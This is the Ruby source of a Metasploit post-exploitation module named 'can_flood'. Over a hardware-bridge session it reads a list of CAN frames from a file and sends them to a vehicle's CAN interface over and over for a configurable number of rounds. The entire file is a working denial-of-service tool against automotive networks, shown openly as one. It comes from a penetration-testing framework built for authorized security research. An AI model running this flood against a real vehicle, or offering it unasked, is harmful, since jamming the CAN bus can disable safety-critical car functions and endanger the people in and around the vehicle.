##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Post
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'can_flood',
        'Description' => 'Module that floods a CAN interface',
        'License' => MSF_LICENSE,
        'Author' => ['Pietro Biondi'],
        'DisclosureDate' => ['March 20 2019'],
        'Platform' => ['hardware'],
        'SessionTypes' => ['hwbridge']
      )
    )
    register_options(
      [
        OptInt.new('ROUND_NUMBER', [false, 'Number of executed rounds', 200]),
        OptString.new('CANBUS', [false, 'CAN interface', nil]),
        OptString.new('FRAMELIST', [true, 'Path to FRAMELIST', ::File.join(Msf::Config.data_directory, 'wordlists', 'frameListCanBus.txt')])
      ]
    )
  end

  def run
    print_status(' -- OPENING FRAMELIST FILE --')
    lines = []
    f = File.open(datastore['FRAMELIST'], 'rb')
    f.each_line do |line|
      lines.push(line.strip)
    end
    f.close
    print_status(' -- FLOODING -- ')
    (0..datastore['ROUND_NUMBER']).each do
      for i in 0..lines.length - 1
        frame = lines.map { |s| s.split('+') }
        client.automotive.cansend(datastore['CANBUS'], frame[i][0], frame[i][1])
      end
    end
  end
end
